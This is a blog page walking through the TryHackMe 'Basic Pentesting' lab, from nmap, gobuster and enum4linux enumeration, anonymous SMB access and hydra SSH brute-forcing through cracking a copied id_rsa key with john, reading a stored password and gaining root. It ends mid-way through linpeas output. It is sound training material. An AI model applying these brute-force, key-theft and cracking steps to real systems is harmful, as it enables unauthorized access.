<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Basic Pentesting | Umar_0x01 ‚Äì Pentester | Programmer | Your average sakurity guy ( Õ°~ Õú ñ Õ°¬∞)</title><meta name=keywords content="ssh,http,smb,nmap,gobuster,bruteforcing,cracking,linpeas,privesc,struts2,suid3num,openssl"><meta name=description content="Walkthrough of the boot2root machine Basic Pentesting on TryHackMe - https://tryhackme.com/room/basicpentestingjt"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/thm-basic_pentesting/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.8f5a9251d00d7a6a24c4b07dbf96a244b3ba30094a1dd1caa9e1d1bcc7238fe9.css integrity="sha256-j1qSUdANemokxLB9v5aiRLO6MAlKHdHKqeHRvMcjj+k=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Basic Pentesting"><meta property="og:description" content="Walkthrough of the boot2root machine Basic Pentesting on TryHackMe - https://tryhackme.com/room/basicpentestingjt"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/thm-basic_pentesting/"><meta property="og:image" content="https://umar0x01.sh/images/overpass-thm/Untitled%202.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-11T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-11T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/overpass-thm/Untitled%202.png"><meta name=twitter:title content="TryHackMe - Basic Pentesting"><meta name=twitter:description content="Walkthrough of the boot2root machine Basic Pentesting on TryHackMe - https://tryhackme.com/room/basicpentestingjt"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Basic Pentesting","item":"https://umar0x01.sh/post/thm-basic_pentesting/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Basic Pentesting","name":"TryHackMe - Basic Pentesting","description":"Walkthrough of the boot2root machine Basic Pentesting on TryHackMe - https://tryhackme.com/room/basicpentestingjt","keywords":["ssh","http","smb","nmap","gobuster","bruteforcing","cracking","linpeas","privesc","struts2","suid3num","openssl"],"articleBody":"Enumeration  Link: https://tryhackme.com/room/basicpentestingjt\nAuthor: https://tryhackme.com/p/ashu\nHost: 10.10.137.134\n Let‚Äôs do an NMAP scan against the host with safe scripts and version fingerprinting of services running on the machine.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# nmap -sC -sV -v -Pn -n 10.10.137.134 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 03:47 PKT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 03:47 Completed NSE at 03:47, 0.00s elapsed ... Scanning 10.10.137.134 [1000 ports] Discovered open port 22/tcp on 10.10.137.134 Discovered open port 445/tcp on 10.10.137.134 Discovered open port 139/tcp on 10.10.137.134 Discovered open port 80/tcp on 10.10.137.134 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA) | 256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA) |_ 256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site does not have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s | nbstat: NetBIOS name: BASIC2, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown) | Names: | BASIC200 Flags: uniqueactive | BASIC203 Flags: uniqueactive | BASIC220 Flags: uniqueactive | WORKGROUP00 Flags: groupactive |_ WORKGROUP1e Flags: groupactive | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: basic2 | NetBIOS computer name: BASIC2\\x00 | Domain name: \\x00 | FQDN: basic2 |_ System time: 2021-04-10T18:48:12-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-10T22:48:11 |_ start_date: N/A NSE: Script Post-scanning. Initiating NSE at 03:48 Completed NSE at 03:48, 0.00s elapsed Initiating NSE at 03:48 Completed NSE at 03:48, 0.00s elapsed Initiating NSE at 03:48 Completed NSE at 03:48, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.03 seconds Raw packets sent: 1207 (53.108KB) | Rcvd: 1001 (40.056KB) Alright, four ports open right off the bat, let‚Äôs start with enumeration of the web server first!\nPort 80 (HTTP) Before running any active scan scripts against the host, let‚Äôs visit the host üòÅ\nNot much really. Let‚Äôs proceed with gobuster after checking /robots.txt as a norm!\nAlright, robots.txt doesn‚Äôt exist, let‚Äôs continue with gobuster, I‚Äôll be using big.txt list from dirb for the directory enumeration.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# gobuster dir -u http://10.10.137.134 -w /usr/share/wordlists/dirb/big.txt -k -e -b 404 -t 100 130 ‚®Ø =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.137.134 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/11 03:51:25 Starting gobuster in directory enumeration mode =============================================================== http://10.10.137.134/.htpasswd (Status: 403) [Size: 297] http://10.10.137.134/.htaccess (Status: 403) [Size: 297] http://10.10.137.134/development (Status: 301) [Size: 320] [-- http://10.10.137.134/development/] http://10.10.137.134/server-status (Status: 403) [Size: 301]  =============================================================== 2021/04/11 03:52:28 Finished =============================================================== Alright, there‚Äôs a valid endpoint /development let‚Äôs check it out.\nhttp://10.10.137.134/development/ indicates two .txt files in it.\nLet‚Äôs go through the contents of these:\nhttp://10.10.137.134/development/dev.txt\n2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K 2018-04-22: SMB has been configured. -K 2018-04-21: I got Apache set up. Will put in our content later. -J http://10.10.137.134/development/j.txt\nFor J: I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP. -K Alright, we get an image of a server that is insecure and the user hash being cracked easily. Also, there are two users (-K and -J), need their full names or at least usernames.\nFor now, let‚Äôs move back to the open ports \u0026 running services found and enumerate them further.\n Port 445 - SMB SMB server running on a linux machine? Let‚Äôs run enum4linux ‚Äî The argument (-a) is for enumerating everything!\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# enum4linux -a 10.10.137.134 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 11 03:54:51 2021  ========================== | Target Information | ========================== Target ........... 10.10.137.134 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ===================================================== | Enumerating Workgroup/Domain on 10.10.137.134 | ===================================================== [+] Got domain/workgroup name: WORKGROUP ============================================= | Nbtstat Information for 10.10.137.134 | ============================================= Looking up status of 10.10.137.134 BASIC2 00 - B ACTIVE Workstation Service BASIC2 03 - B ACTIVE Messenger Service BASIC2 20 - B ACTIVE File Server Service ..__MSBROWSE__. 01 - GROUP B ACTIVE Master Browser WORKGROUP 00 - GROUP B ACTIVE Domain/Workgroup Name WORKGROUP 1d - B ACTIVE Master Browser WORKGROUP 1e - GROUP B ACTIVE Browser Service Elections MAC Address = 00-00-00-00-00-00 ====================================== | Session Check on 10.10.137.134 | ====================================== [+] Server 10.10.137.134 allows sessions using username '', password '' ============================================ | Getting domain SID for 10.10.137.134 | ============================================ Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup ======================================= | OS information on 10.10.137.134 | ======================================= Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for 10.10.137.134 from smbclient: [+] Got OS info for 10.10.137.134 from srvinfo: BASIC2 Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu platform_id : 500 os version : 6.1 server type : 0x809a03 ============================== | Users on 10.10.137.134 | ============================== Use of uninitialized value $users in print at ./enum4linux.pl line 874. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.  Use of uninitialized value $users in print at ./enum4linux.pl line 888. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.  ========================================== | Share Enumeration on 10.10.137.134 | ========================================== Sharename Type Comment --------- ---- ------- Anonymous Disk IPC$ IPC IPC Service (Samba Server 4.3.11-Ubuntu) SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.137.134 //10.10.137.134/Anonymous Mapping: OK, Listing: OK //10.10.137.134/IPC$ [E] Can't understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ===================================================== | Password Policy Information for 10.10.137.134 | ===================================================== [+] Attaching to 10.10.137.134 using a NULL share [+] Trying protocol 139/SMB... [+] Found domain(s): [+] BASIC2 [+] Builtin [+] Password Info for Domain: BASIC2 [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes ... The output is really long so I‚Äôve snipped it, what we need is the Share Enumeration on 10.10.137.134 part.\nWe can see that there‚Äôs an Anonymous share opened on the machine that is accessible without any credentials. Let‚Äôs try accessing it! We can use smbclient for doing so.\nsmbclient //10.10.137.134/Anonymous We can press ENTER on password prompt since it‚Äôs an anonymous share!\nWe can see that there‚Äôs a file in the server, let‚Äôs download it by using get\nsmb: \\ get staff.txt getting file \\staff.txt of size 173 as staff.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) Let‚Äôs go through it‚Äôs contents:\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# cat staff.txt Announcement to staff: PLEASE do not upload non-work-related items to this share. I know it's all in fun, but this is how mistakes happen. (This means you too, Jan!) -Kay We get both the usernames from this file (i.e. Jan \u0026 Kay).\nNote: Going through the full output of enum4linux, it also enumerated both names of both the users!\n Initial User Since, we‚Äôve the users enumerated, let‚Äôs utilize hydra to bruteforce SSH credentials! (I know it‚Äôs painful! üò©)\nAh well, after some time, we got the valid credentials. Checked into rockyou.txt and the word was at 780, why would the machine author do this to innocent souls!? üòø\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# grep armando /usr/share/wordlists/rockyou.txt -n 130 ‚®Ø 780:armando 12617:armando1 71412:armandoteamo 92592:josearmando Got SSH access! sudo -l ain‚Äôt allowed for our user.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# ssh jan@10.10.137.134 The authenticity of host '10.10.137.134 (10.10.137.134)' can't be established. ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.137.134' (ECDSA) to the list of known hosts. jan@10.10.137.134's password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage  0 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ ls -al total 12 drwxr-xr-x 2 root root 4096 Apr 23 2018 . drwxr-xr-x 4 root root 4096 Apr 19 2018 .. -rw------- 1 root jan 47 Apr 23 2018 .lesshst jan@basic2:~$ sudo -l [sudo] password for jan: Sorry, try again. [sudo] password for jan: Sorry, user jan may not run sudo on basic2. jan@basic2:~$  Privileges Escalation Let‚Äôs continue with the local enumeration. Since, we know there‚Äôs another user Key in the machine. Let‚Äôs check it‚Äôs directory and it‚Äôs contents.\njan@basic2:/home/kay$ ls -al total 48 drwxr-xr-x 5 kay kay 4096 Apr 23 2018 . drwxr-xr-x 4 root root 4096 Apr 19 2018 .. -rw------- 1 kay kay 756 Apr 23 2018 .bash_history -rw-r--r-- 1 kay kay 220 Apr 17 2018 .bash_logout -rw-r--r-- 1 kay kay 3771 Apr 17 2018 .bashrc drwx------ 2 kay kay 4096 Apr 17 2018 .cache -rw------- 1 root kay 119 Apr 23 2018 .lesshst drwxrwxr-x 2 kay kay 4096 Apr 23 2018 .nano -rw------- 1 kay kay 57 Apr 23 2018 pass.bak -rw-r--r-- 1 kay kay 655 Apr 17 2018 .profile drwxr-xr-x 2 kay kay 4096 Apr 23 2018 .ssh -rw-r--r-- 1 kay kay 0 Apr 17 2018 .sudo_as_admin_successful -rw------- 1 root kay 538 Apr 23 2018 .viminfo jan@basic2:/home/kay$ jan@basic2:/home/kay$ find .ssh/ -ls 798691 4 drwxr-xr-x 2 kay kay 4096 Apr 23 2018 .ssh/ 798921 4 -rw-rw-r-- 1 kay kay 771 Apr 23 2018 .ssh/authorized_keys 798917 4 -rw-r--r-- 1 kay kay 3326 Apr 19 2018 .ssh/id_rsa 798918 4 -rw-r--r-- 1 kay kay 771 Apr 19 2018 .ssh/id_rsa.pub Oh wow! Can‚Äôt read pass.bak but private SSH key file is readable by our user! Let‚Äôs utilize this for SSH against Kay!\njan@basic2:/home/kay$ ssh -i .ssh/id_rsa key@localhost Could not create directory '/home/jan/.ssh'. The authenticity of host 'localhost (::1)' can't be established. ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts). key@localhost's password: Ah well, the key is encrypted as well. We can identify that by either SSHing (and seeing the password ‚Äî sometimes if the key is wrong, it still asks for password) or checking the header (first 2-3 lines) of id_rsa file.\nDownload the file id_rsa locally and convert it to john's readable format for cracking using ssh2john.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# curl https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py -O 130 ‚®Ø  % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 8696 100 8696 0 0 9949 0 --:--:-- --:--:-- --:--:-- 9938 ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# python3 ssh2john.py id_rsa  id_rsa.hash ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# cat id_rsa.hash id_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8655c5f98cb7441c2b8a0a3b569118ca8b14dc1a3f125857a1dab94a1513137b6d4a68f9e2d856ce66a39b5ba560e18b43517e718fd6de9b9fb4ef6fbec009ac86cc774ba4802a666bffd21c114e7adb455858d4251fef118d99b9b3607ccd130329a44da2f261526951422440b7703827e53bd05177e1e82249455ae177157256a563b28b7e0b317b99b5a6e6716c4cf3e53a79dd0ba266ad41148de21b2f305c5ba6d7e6cf9bf7978579c79632655e0745a1aa73ed0ed56d837b05763c69d218065ea2b86c03019cce1c84570aed1a6f0918ec2b25985440c9318bdcf3b674cacbcea559fd5a714e51d38df94e2960fe8f98d53865dd907a434859811764864ccb2a6e18215d03448045febf90ac06a073800822b78a101028a6cef927e581705a1d76fa934a1c31001620ec5826e9cf28df1bcf39502c9b3526b65789b86555a3de57b5f6e4d694caee6ee1b82d1616ff7fc68129b7a5e1795647ee07c5ba2da49c7a45507210f67f91588eab74b51a9c074916689f7db4c40e2138f91c1bae890f21e54ba077dbcb95888e836ba7eb6223a70384c48c94cf3b946971210a40a220eb980809ba5c5a3d54e08f6610765e1dcd2bda5cae7d96e77d852bd2a095a3cfa64bc5fbe6c79ea0dcfc6ae40be03238217213ab9b1a0873f8cbf9ed9b3d40dd0d0536365702a7452bf85301d84c4397621979cdc37b5b983f301af78655f352684c57799037f633a09b755ba0de9c017a73d76e0a8f46c4c33c4207358a8b408f1c52d8b8ca0378ba8ffcd224a125e5a0973c6997a6225e51007e600c22d3e24ebbc1e8bd8ff250eb32d44f4bd298ba27a3522215db0c3b89d49f2277cfedd74c3b59a1497936263826308f2e14cd363025aa7a5c39aa9a77b815dd10ff6ac9a5d8bda4074513f0fad3b6df926da5ca3c51f47479a8c271a60dab493fe78cadce92f3debe1c05ef72f3f194a36d23bfa3b0d4f0b8f04236d485be8d7d97dfb1c5de79613568d58f113308e8a73c7b87ca11b7b53e63d37f055b5bb7e5f39982e7bbedea3aae16daa3b29ccd8f9d98d53e97a1fbc0c1a2e701e5b7d7b224a4371358b02103e25b29c54138b8c4b7c9706967fe384b263c284ceb0336887e7da79e3c10d54d85689c0db4c379388b2138d0c40017fd2256aae3a2d21a93116a134d5f0ce8ce1fbf2c61509868c823fccdff62aca54796ff99aa5b0bc588af10537f26eccfa6962e595fbeac9df244f6cbaf6b77a11cfd8078de615833305fe0ae0d22173e8d744435fe3a69a81313109f9c5cdcb56d67544a36aa27a3b7c0db50b3b829972368ff2ed998c1910b392720c0d4cbaa907a49f2c38f970503971d64b6972f5b7b5c34735a08129c2b7ee82c6ccc49ddc943a5ae2f4467c5d7a07859e39ae00023c771d59caca0817ce412d35849abd9d225ed96e34de5266b31fd4dd82dab9469582b1e41687a39f108da54b6e84771542cb11f5c522e62b79b6867e8a20df2e8c9bf9ff36634c0de536fa3d377fa27543b6c90895f13bdf50f03b2dd97e5d25d452fa6a0d225704eb3c19751864285dfe3031bc2ff5b0c5d19a7feae6ad5625757477aa3c3f0eb635717f1f5b9037b3a76425db2a2151e2810eefbb75853d939360d1240093b2497a8903eff9b98bc705c2afe0e5541af2bb06b0ec50e4caf798a7f59ffc3a3e70565d887b9f694bdfa64d15a70ed55eacccc69af3fe3cf5aa5b6e3a7186eb5036e12efe53fcc509719a6a6f3ec0c008cb6a035229a1597d9be6beb13444d84c93f2164844c8ae69aa13648578087b98e90dd03f9da47d9ce306dddc88dd80998bf6d3910d209bebb1a70f8b73d944d949b1b1b19b13a455776f3c2e6647fa6722fc2bad5b202502684e91514a11e3437a92a09febffcfc3d55095b43e14b0567e8f5cbd91728b693fe82b8f75ccaf27c0651152faaf0610d2edcabc0b9ac51895180fbf60b868771dee58edb97e99d5ca3592cc9733a76ae0b96ca5788be62e8fb006204c574482579701781b46ec979bdbc9d339e57967051ca87fadae7184bd79cac0af834632081c5df6189dcc4cc8a0170cac12c30c1fff21c4c17f20813112bf901df81c5d78ca22024f1cd58cb5b73c1d68c6529ce4b21d7b95941e099f9a6140bdd1f0ead9113b2e5f17c354aacf79a38a104d6f844559417552387182ba20d890203a6a5e9661d23d8b6fae351a208ef5550555592011fec39609858b6b22743b0cca80c97d58076a660be95e460177cab3fd6b690b01a0e4f5d0507157afe9c4dc7f384187256a9a5d56ab00d466d44e4f07e5f348e8f100e5abe1c4d1bbc207fa3617140a604b607c7e3f5020f9aabb0700ad790e7847e085eb2243e503bf7d097ae15a2ee6179262e351773bb880123c0a87a43f62380fbe08fc2c63ac08ffe2ba0c6deeefbdd49eeaa2ffd1053aceec67b25f92dcfd25b58fa4fab2328481af26f5f4b5d21e1312b78f913b7f08254b064336d84c1aa3c82582e1cde55b5a347d264cb9e98df34b5490831e5d212b38b7cd999daf186a97efd6250e1e6820079358542f77ac78ddd9a505919c318000fc47f8b80fc84f12cf58adf1a3ee3fc8190015058c16c414cc0d6017b9a1fb032ee20e842573b30fc3214ac5fb8962437477e81bb6479fa498f148924796d6d616218ec2a5fa0949def8542dc9b75fd95b75c26fbe91ef9b06e61e90e0df20bb973f33471dab5e87f4c1f0a5d8a7f4e653a8edb337116fa6e5ed858 Let‚Äôs get cracking!\nCracked successfully and fast this time! üòÅ\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 1 ‚®Ø Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status beeswax (id_rsa) Warning: Only 2 candidates left, minimum 4 needed for performance. 1g 0:00:00:03 DONE (2021-04-11 04:26) 0.2710g/s 3886Kp/s 3886Kc/s 3886KC/sa6_123..*7¬°Vamos! Session completed Let‚Äôs SSH into the machine utilizing the id_rsa and password cracked now!\nRemember, we can‚Äôt still do sudo -l since that requires user password while we only have the key‚Äôs password.\nI did that try the cracked key password though, but it didn‚Äôt work!\nSee that pass.bak file there? üòè Let‚Äôs check it‚Äôs contents.\nkay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ Root User! Used the password and we can run any binary as any user with sudo.\nkay@basic2:~$ sudo -l [sudo] password for kay: Matching Defaults entries for kay on basic2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User kay may run the following commands on basic2: (ALL : ALL) ALL Aaaand, we‚Äôre root!\nroot@basic2:~# cat flag.txt Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain a shell, and two ways to privesc. I encourage you to find them all! If you're in the target audience (newcomers to pentesting), I hope you learned something. A few takeaways from this challenge should be that every little bit of information you can find can be valuable, but sometimes you'll need to find several different pieces of information and combine them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding an obviously outdated, vulnerable service right away with a port scan (unlike the first entry in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and therefore might've been overlooked by administrators. Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send  me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach out to me. Happy hacking! That was easy and definitely a basic pentesting machine! Hopefully you enjoyed reading till the end (that is if you did üòÑ)\n Alternate method to PrivEsc! The flag mentions there‚Äôs an alternate method to privesc too! Let‚Äôs find that out.\nLet‚Äôs run linpeas and note all the actionable things!\n The kernel version looks really old.  ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Basic information ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê OS: Linux version 4.4.0-119-generic (buildd@lcy01-amd64-013) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #143-Ubuntu SMP Mon Apr 2 16:08:24 UTC 2018  Services listening on port 8005 locally (remember the server we saw in the initial .txts maybe?) Also, port 8080 and 8009 listening from everywhere! Nmap (-sC and -sV) missed this ‚Äî Always full port scan first! üòõ  [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::445 :::* LISTEN - tcp6 0 0 127.0.0.1:8005 :::* LISTEN - tcp6 0 0 :::8009 :::* LISTEN - tcp6 0 0 :::139 :::* LISTEN - tcp6 0 0 :::8080 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN -  Haven‚Äôt seen this before, but maybe the SMB service‚Äôs secrets file (only readable/writeable by root)  [+] Searching AD cached hashes -rw------- 1 root root 430080 Apr 19 2018 /var/lib/samba/private/secrets.tdb  Highlighted SUID and ntfs-3g (I remember some exploits on them)  ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid  strings Not Found -rwsr-xr-x 1 root root 44K May 7 2014 